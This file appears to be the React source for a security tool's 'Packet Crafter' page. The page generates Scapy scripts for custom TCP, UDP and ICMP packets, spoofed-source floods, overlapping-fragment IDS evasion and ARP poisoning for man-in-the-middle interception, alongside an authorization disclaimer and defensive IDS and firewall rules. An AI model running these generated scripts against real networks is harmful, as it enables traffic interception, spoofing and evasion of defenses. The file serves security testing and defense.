import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Switch } from "@/components/ui/switch";
import { Slider } from "@/components/ui/slider";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { useDocumentTitle } from "@/hooks/useDocumentTitle";
import { Copy, Check, AlertTriangle, Package, Network, Shield, ChevronRight, Play, RefreshCw } from "lucide-react";

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <Button size="sm" variant="ghost" onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }}>
      {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
    </Button>
  );
}

const TCP_FLAGS: { key: string; label: string; bit: number }[] = [
  { key: "SYN", label: "SYN", bit: 0x002 },
  { key: "ACK", label: "ACK", bit: 0x010 },
  { key: "FIN", label: "FIN", bit: 0x001 },
  { key: "RST", label: "RST", bit: 0x004 },
  { key: "PSH", label: "PSH", bit: 0x008 },
  { key: "URG", label: "URG", bit: 0x020 },
];

export default function PacketCrafterPage() {
  useDocumentTitle("Packet Crafter");
  const { toast } = useToast();

  const [proto, setProto] = useState("TCP");
  const [srcIp, setSrcIp] = useState("192.168.1.100");
  const [dstIp, setDstIp] = useState("192.168.1.1");
  const [srcPort, setSrcPort] = useState("12345");
  const [dstPort, setDstPort] = useState("80");
  const [ttl, setTtl] = useState(64);
  const [flags, setFlags] = useState<Record<string, boolean>>({ SYN: true, ACK: false, FIN: false, RST: false, PSH: false, URG: false });
  const [payload, setPayload] = useState("GET / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n");
  const [count, setCount] = useState(1);
  const [interval_ms, setIntervalMs] = useState(100);
  const [spoofSrc, setSpoofSrc] = useState(false);
  const [fragOffset, setFragOffset] = useState(0);
  const [moreFrags, setMoreFrags] = useState(false);
  const [icmpType, setIcmpType] = useState("8");
  const [icmpCode, setIcmpCode] = useState("0");

  const toggleFlag = (f: string) => setFlags(prev => ({ ...prev, [f]: !prev[f] }));
  const flagStr = Object.entries(flags).filter(([, v]) => v).map(([k]) => k).join("|") || "none";
  const flagHex = TCP_FLAGS.reduce((acc, f) => acc | (flags[f.key] ? f.bit : 0), 0);

  const generateScapyScript = () => {
    const spoofLine = spoofSrc ? `\n# Spoof source IP\nconf.verb = 0` : "";
    const fragLine = fragOffset > 0 ? `\npkt = IP(src=SRC_IP, dst=DST_IP, ttl=${ttl}, frag=${fragOffset}, flags="MF" if ${moreFrags} else 0)/` : "";

    if (proto === "TCP") return `#!/usr/bin/env python3
# AegisAI360 — Custom TCP Packet Crafter | AUTHORIZED USE ONLY
from scapy.all import *
${spoofLine}
SRC_IP = "${spoofSrc ? "RandIP()" : srcIp}"
DST_IP = "${dstIp}"
SRC_PORT = ${srcPort}
DST_PORT = ${dstPort}
TTL = ${ttl}
COUNT = ${count}
INTERVAL = ${interval_ms / 1000}
PAYLOAD = "${payload}"
FLAGS = "${flagStr}"  # hex: 0x${flagHex.toString(16).padStart(3, '0')}

pkt = IP(src=SRC_IP if SRC_IP != "RandIP()" else RandIP(), dst=DST_IP, ttl=TTL) / \\
      TCP(sport=SRC_PORT, dport=DST_PORT, flags=FLAGS) / \\
      Raw(load=PAYLOAD)

print(f"[*] Packet details:")
pkt.show()
print(f"\\n[*] Sending {COUNT} packet(s) with {INTERVAL}s interval...")
for i in range(COUNT):
    ans = sr1(pkt, timeout=2, verbose=0)
    if ans:
        print(f"[+] Response: {ans.summary()}")
    else:
        print(f"[-] No response (packet {i+1})")
    if i < COUNT-1: time.sleep(INTERVAL)
print("[*] Done")`;

    if (proto === "UDP") return `#!/usr/bin/env python3
# AegisAI360 — Custom UDP Packet Crafter | AUTHORIZED USE ONLY
from scapy.all import *
import time

SRC_IP = "${spoofSrc ? "str(RandIP())" : `"${srcIp}"`}"
DST_IP = "${dstIp}"
SRC_PORT = ${srcPort}
DST_PORT = ${dstPort}
TTL = ${ttl}
COUNT = ${count}
INTERVAL = ${interval_ms / 1000}
PAYLOAD = b"${payload}"

for i in range(COUNT):
    pkt = IP(src=${spoofSrc ? "str(RandIP())" : "SRC_IP"}, dst=DST_IP, ttl=TTL) / \\
          UDP(sport=SRC_PORT, dport=DST_PORT) / Raw(load=PAYLOAD)
    ans = sr1(pkt, timeout=2, verbose=0)
    print(f"[{'+'if ans else'-'}] Packet {i+1}: {'Response: ' + ans.summary() if ans else 'No response'}")
    time.sleep(INTERVAL)`;

    if (proto === "ICMP") return `#!/usr/bin/env python3
# AegisAI360 — Custom ICMP Packet Crafter | AUTHORIZED USE ONLY
from scapy.all import *
import time

SRC_IP = "${spoofSrc ? "str(RandIP())" : `"${srcIp}"`}"
DST_IP = "${dstIp}"
ICMP_TYPE = ${icmpType}   # 8=echo, 0=echo-reply, 3=dest-unreachable, 11=TTL-exceeded
ICMP_CODE = ${icmpCode}
TTL = ${ttl}
COUNT = ${count}
INTERVAL = ${interval_ms / 1000}

for i in range(COUNT):
    pkt = IP(src=SRC_IP, dst=DST_IP, ttl=TTL) / ICMP(type=ICMP_TYPE, code=ICMP_CODE)
    ans = sr1(pkt, timeout=2, verbose=0)
    rtt = ans.time - pkt.sent_time if ans else None
    print(f"[{'+'if ans else'-'}] {i+1}: RTT={rtt*1000:.2f}ms" if rtt else f"[-] {i+1}: No response")
    time.sleep(INTERVAL)`;

    if (proto === "Fragment") return `#!/usr/bin/env python3
# AegisAI360 — IP Fragmentation Attack | AUTHORIZED USE ONLY
# Bypasses firewalls/IDS that don't reassemble fragments
from scapy.all import *
import time

SRC_IP = "${spoofSrc ? "str(RandIP())" : `"${srcIp}"`}"
DST_IP = "${dstIp}"
DST_PORT = ${dstPort}
TTL = ${ttl}
PAYLOAD = b"${payload}" * 100  # 100x to create large payload for fragmentation

# Build full packet
full_pkt = IP(src=SRC_IP, dst=DST_IP, ttl=TTL) / TCP(sport=${srcPort}, dport=DST_PORT) / Raw(PAYLOAD)

# Fragment at 8-byte boundaries
frags = fragment(full_pkt, fragsize=${fragOffset > 0 ? fragOffset * 8 : 64})
print(f"[*] Fragmenting into {len(frags)} fragments of ${fragOffset > 0 ? fragOffset * 8 : 64} bytes")
for i, frag in enumerate(frags):
    print(f"  Fragment {i+1}: offset={frag.frag*8}, MF={bool(frag.flags & 0x1)}")
    
send(frags, verbose=0)
print("[*] Fragments sent — check target for reassembly behavior")

# Overlapping fragments (evasion technique)
print("\\n[*] Sending overlapping fragments for IDS evasion...")
frag1 = IP(src=SRC_IP, dst=DST_IP, ttl=TTL, id=1337, flags="MF", frag=0) / Raw(b"A"*16)
frag2 = IP(src=SRC_IP, dst=DST_IP, ttl=TTL, id=1337, flags="MF", frag=1) / Raw(b"B"*8 + b"C"*8)  # Overlap
frag3 = IP(src=SRC_IP, dst=DST_IP, ttl=TTL, id=1337, frag=3) / Raw(b"D"*8)
send([frag1, frag2, frag3], verbose=0)`;

    if (proto === "ARP") return `#!/usr/bin/env python3
# AegisAI360 — ARP Spoofing / Poisoning | AUTHORIZED USE ONLY
from scapy.all import *
import time, threading

IFACE = "eth0"
GATEWAY_IP = "${dstIp}"
VICTIM_IP = "${srcIp}"

def get_mac(ip):
    arp = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    ans = srp(broadcast/arp, timeout=2, verbose=0)[0]
    return ans[0][1].hwsrc if ans else None

GATEWAY_MAC = get_mac(GATEWAY_IP)
VICTIM_MAC = get_mac(VICTIM_IP)
print(f"[*] Gateway: {GATEWAY_IP} ({GATEWAY_MAC})")
print(f"[*] Victim:  {VICTIM_IP} ({VICTIM_MAC})")

def poison():
    # Tell victim we are the gateway
    send(ARP(op=2, pdst=VICTIM_IP, hwdst=VICTIM_MAC, psrc=GATEWAY_IP), verbose=0)
    # Tell gateway we are the victim
    send(ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=VICTIM_IP), verbose=0)

print("[*] ARP Poisoning active — enabling IP forward for MITM...")
import subprocess
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
try:
    while True:
        poison()
        time.sleep(2)
except KeyboardInterrupt:
    print("\\n[*] Restoring ARP tables...")
    send(ARP(op=2, pdst=VICTIM_IP, hwdst=VICTIM_MAC, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC), count=5, verbose=0)
    send(ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=VICTIM_IP, hwsrc=VICTIM_MAC), count=5, verbose=0)`;

    return "# Select a protocol to generate a script";
  };

  const script = generateScapyScript();

  const PROTOCOLS = ["TCP", "UDP", "ICMP", "Fragment", "ARP"];

  return (
    <div className="p-4 md:p-6 space-y-4">
      <div>
        <h1 className="text-lg font-bold tracking-wider uppercase flex items-center gap-2">
          <Package className="w-5 h-5 text-primary" />
          Network Packet Crafter
        </h1>
        <p className="text-xs text-muted-foreground">Craft custom TCP/UDP/ICMP/ARP/fragmented packets for network security testing, IDS evasion research, and protocol analysis</p>
      </div>

      <Alert className="border-severity-medium/50 bg-severity-medium/10">
        <AlertTriangle className="w-4 h-4 text-severity-medium" />
        <AlertDescription className="text-xs" data-testid="text-packet-disclaimer">
          <span className="font-semibold">Authorized Use Only</span> — Packet injection on networks you do not own or have explicit authorization to test is illegal. Use only in controlled lab environments or with written permission.
        </AlertDescription>
      </Alert>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-4">
        <div className="xl:col-span-1 space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider">Protocol & Layer</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              {PROTOCOLS.map((p) => (
                <button
                  key={p}
                  onClick={() => setProto(p)}
                  data-testid={`button-proto-${p.toLowerCase()}`}
                  className={`w-full text-left p-2.5 rounded-md border transition-all text-xs flex items-center justify-between ${proto === p ? "border-primary bg-primary/10" : "border-border/50 hover:border-primary/40"}`}
                >
                  <span className="font-semibold">{p}</span>
                  <Badge variant="outline" className="text-[9px]">
                    {p === "TCP" ? "L4" : p === "UDP" ? "L4" : p === "ICMP" ? "L3" : p === "Fragment" ? "L3" : "L2"}
                  </Badge>
                </button>
              ))}
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider">IP Header</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <div className="space-y-1">
                <Label className="text-xs">Source IP</Label>
                <Input value={srcIp} onChange={(e) => setSrcIp(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-src-ip" />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Destination IP</Label>
                <Input value={dstIp} onChange={(e) => setDstIp(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-dst-ip" />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">TTL: <span className="font-mono text-primary">{ttl}</span></Label>
                <Slider value={[ttl]} onValueChange={([v]) => setTtl(v)} min={1} max={255} step={1} />
              </div>
              <div className="flex items-center justify-between">
                <Label className="text-xs">Spoof Source IP</Label>
                <Switch checked={spoofSrc} onCheckedChange={setSpoofSrc} data-testid="switch-spoof-src" />
              </div>
            </CardContent>
          </Card>

          {proto === "TCP" && (
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-xs uppercase tracking-wider">TCP Flags</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-3 gap-2">
                  {TCP_FLAGS.map((f) => (
                    <button
                      key={f.key}
                      onClick={() => toggleFlag(f.key)}
                      data-testid={`button-flag-${f.key.toLowerCase()}`}
                      className={`p-2 rounded-md border text-xs font-mono font-bold transition-all ${flags[f.key] ? "border-primary bg-primary/20 text-primary" : "border-border/50 text-muted-foreground hover:border-primary/40"}`}
                    >
                      {f.label}
                    </button>
                  ))}
                </div>
                <p className="text-[10px] text-muted-foreground mt-2 font-mono">flags=0x{flagHex.toString(16).padStart(3, '0')} ({flagStr})</p>
              </CardContent>
            </Card>
          )}

          {proto === "ICMP" && (
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-xs uppercase tracking-wider">ICMP Config</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <div className="space-y-1">
                  <Label className="text-xs">Type</Label>
                  <Select value={icmpType} onValueChange={setIcmpType}>
                    <SelectTrigger className="h-8 text-xs" data-testid="select-icmp-type">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="8">8 — Echo Request</SelectItem>
                      <SelectItem value="0">0 — Echo Reply</SelectItem>
                      <SelectItem value="3">3 — Dest Unreachable</SelectItem>
                      <SelectItem value="11">11 — TTL Exceeded</SelectItem>
                      <SelectItem value="5">5 — Redirect</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-1">
                  <Label className="text-xs">Code</Label>
                  <Input value={icmpCode} onChange={(e) => setIcmpCode(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-icmp-code" />
                </div>
              </CardContent>
            </Card>
          )}
        </div>

        <div className="xl:col-span-2 space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider">Transport Layer</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              {(proto === "TCP" || proto === "UDP") && (
                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <Label className="text-xs">Source Port</Label>
                    <Input value={srcPort} onChange={(e) => setSrcPort(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-src-port" />
                  </div>
                  <div className="space-y-1">
                    <Label className="text-xs">Destination Port</Label>
                    <Input value={dstPort} onChange={(e) => setDstPort(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-dst-port" />
                  </div>
                </div>
              )}

              <div className="space-y-1">
                <Label className="text-xs">Payload</Label>
                <Input value={payload} onChange={(e) => setPayload(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-payload" placeholder="Packet payload / data" />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1">
                  <Label className="text-xs">Count: <span className="text-primary font-mono">{count}</span></Label>
                  <Slider value={[count]} onValueChange={([v]) => setCount(v)} min={1} max={10000} step={1} />
                </div>
                <div className="space-y-1">
                  <Label className="text-xs">Interval: <span className="text-primary font-mono">{interval_ms}ms</span></Label>
                  <Slider value={[interval_ms]} onValueChange={([v]) => setIntervalMs(v)} min={0} max={5000} step={10} />
                </div>
              </div>

              {proto === "Fragment" && (
                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <Label className="text-xs">Fragment Offset (8-byte units)</Label>
                    <Input value={fragOffset} onChange={(e) => setFragOffset(parseInt(e.target.value) || 0)} className="h-8 text-xs font-mono" type="number" data-testid="input-frag-offset" />
                  </div>
                  <div className="flex items-center justify-between pt-5">
                    <Label className="text-xs">More Fragments (MF bit)</Label>
                    <Switch checked={moreFrags} onCheckedChange={setMoreFrags} data-testid="switch-more-frags" />
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <div className="flex items-center justify-between">
                <CardTitle className="text-xs uppercase tracking-wider">Scapy Script — {proto} Packet</CardTitle>
                <CopyButton text={script} />
              </div>
            </CardHeader>
            <CardContent>
              <pre className="bg-muted/30 rounded-md p-4 text-[10px] font-mono overflow-x-auto max-h-80 overflow-y-auto" data-testid="code-packet-script">{script}</pre>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
                <Shield className="w-4 h-4 text-primary" />
                Detection & Defense
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              {[
                { t: "TCP RST/SYN Flood", d: "IDS rule: alert tcp any any -> $HOME_NET any (flags:S; threshold:type threshold,track by_src,count 100,seconds 1; msg:\"SYN Flood\";)" },
                { t: "IP Spoofing", d: "Enable uRPF (BCP38): ip verify unicast source reachable-via rx — drops packets with invalid source IPs" },
                { t: "Fragmentation Evasion", d: "Configure firewall to reassemble fragments before inspection: iptables -A FORWARD -m conntrack --ctstate INVALID -j DROP" },
                { t: "ARP Spoofing", d: "Enable Dynamic ARP Inspection (DAI) on switches, use static ARP entries for critical hosts" },
                { t: "Packet Injection", d: "Network segmentation + 802.1X port auth prevents unauthorized injection on switched networks" },
              ].map((item, i) => (
                <div key={i} className="border border-border/30 rounded-md p-2.5">
                  <div className="text-xs font-semibold text-primary mb-1">{item.t}</div>
                  <div className="text-[10px] font-mono text-muted-foreground">{item.d}</div>
                </div>
              ))}
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
